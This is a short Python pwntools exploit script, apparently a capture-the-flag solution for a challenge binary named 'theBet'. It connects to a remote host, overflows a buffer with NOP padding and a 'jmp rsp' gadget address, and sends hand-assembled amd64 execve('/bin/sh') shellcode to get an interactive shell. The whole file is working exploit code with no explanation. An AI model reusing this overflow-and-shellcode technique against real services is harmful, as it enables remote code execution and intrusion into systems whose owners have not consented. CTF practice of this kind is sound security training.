from pwn import *

def shellcode():

	# execve syscall
	shell = ''
	shell += 'push rbx\n'
	shell += 'push 0x0\n'
	shell += 'pop rsi\n'
	shell += 'push rsi\n'
	shell += 'pop rdx\n'
	shell += 'push rbx\n'
	shell += 'push 0x68732f\n'
	shell += 'push rsp\n'
	shell += 'pop rbx\n'
	shell += 'shl qword ptr [rbx], 0x20\n'
	shell += 'push 0x6e69622f\n'
	shell += 'pop rax\n'
	shell += 'add qword ptr [rbx], rax\n'
	shell += 'push rbx\n'
	shell += 'pop rdi\n'
	shell += 'push 0x3b\n'
	shell += 'pop rax\n'
	shell += 'syscall\n'
	
	shell = asm(shell)
	print(disasm(shell))

	return shell

if __name__=="__main__":
	context.arch='amd64'
	#p = process('./theBet')
	p = remote('gc1.eng.run', 31795)
	#gdb.attach(p)
	
	p.recv()
	p.sendline('aaaa')
	p.recv()
	p.sendline('1')
	
	p.recv()
	pay = '\x90'*(0x28)
	pay += p64(0x000000000040127e)# jmp rsp
	pay += shellcode()
	print(len(pay))
	
	p.sendline(pay)
	
	p.interactive()
	
